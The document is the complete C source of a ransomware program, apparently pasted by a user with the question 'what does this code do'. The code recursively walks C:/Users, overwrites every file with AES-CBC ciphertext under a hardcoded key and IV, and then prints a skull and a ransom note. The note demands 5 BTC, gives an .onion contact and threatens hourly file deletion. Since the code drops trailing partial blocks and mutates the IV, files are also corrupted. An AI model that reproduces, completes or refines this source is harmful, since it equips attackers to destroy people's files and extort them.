#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <time.h>
#include <dirent.h>
#include <openssl/aes.h>

#define KEYLEN 256
#define BLOCK_SIZE 16

const unsigned char key[KEYLEN/8] = "VeryStrongHardcodedKeyOf32Byte!";
const unsigned char iv[BLOCK_SIZE] = "RandomInitVector";

void encryptFile(const char *filename) {
    FILE *infile = fopen(filename, "rb");
    if (!infile) return;

    fseek(infile, 0, SEEK_END);
    long fsize = ftell(infile);
    rewind(infile);

    unsigned char *buffer = malloc(fsize);
    fread(buffer, 1, fsize, infile);
    fclose(infile);

    AES_KEY aesKey;
    AES_set_encrypt_key(key, KEYLEN, &aesKey);

    unsigned char *enc_out = malloc(fsize + BLOCK_SIZE);
    int num_blocks = fsize / BLOCK_SIZE;
    for (int i = 0; i < num_blocks; i++) {
        AES_cbc_encrypt(buffer + (i * BLOCK_SIZE), enc_out + (i * BLOCK_SIZE), BLOCK_SIZE, &aesKey, (unsigned char*)iv, AES_ENCRYPT);
    }

    FILE *outfile = fopen(filename, "wb");
    fwrite(enc_out, 1, fsize, outfile);
    fclose(outfile);

    free(buffer);
    free(enc_out);
}

void showRansomNote() {
    system("cls");
    printf("\033[1;31m");  // Set red color
    printf("            ▄██████████████▄\n");
    printf("          ████▀▀        ▀▀████\n");
    printf("        ███▀    ▄▄▄▄▄▄     ▀███\n");
    printf("       ███    ▀▀▀▀▀▀▀▀▀▀     ███\n");
    printf("       ███   ▄▄███▄███▄▄     ███\n");
    printf("       ███  ▄█▀▄██▄▀▄█▀█▄    ███\n");
    printf("       ███  █▄▄▄▄▄▄▄▄▄▄█    ███\n");
    printf("       ███   ▀▀▀▀▀▀▀▀▀▀     ███\n");
    printf("        ███▄             ▄███\n");
    printf("          ████▄▄▄▄▄▄▄▄████\n");
    printf("             ▀████████▀\n\n");

    printf("  YOUR FILES HAVE BEEN ENCRYPTED!\n");
    printf("  SEND 5 BTC TO THE WALLET TO DECRYPT THEM!\n");
    printf("  CONTACT: dead@skullmail.onion\n");
    printf("  DON'T WASTE TIME. EVERY HOUR A FILE IS DELETED.\n");
    printf("\033[0m");
}

void recurseAndEncrypt(const char *basePath) {
    DIR *dir;
    struct dirent *entry;
    char path[1000];

    dir = opendir(basePath);
    if (!dir) return;

    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;

        snprintf(path, sizeof(path), "%s/%s", basePath, entry->d_name);

        if (entry->d_type == DT_DIR) {
            recurseAndEncrypt(path);
        } else {
            encryptFile(path);
        }
    }
    closedir(dir);
}

int main() {
    const char *targetDir = "C:/Users";
    recurseAndEncrypt(targetDir);
    showRansomNote();
    return 0;
} what does this code do
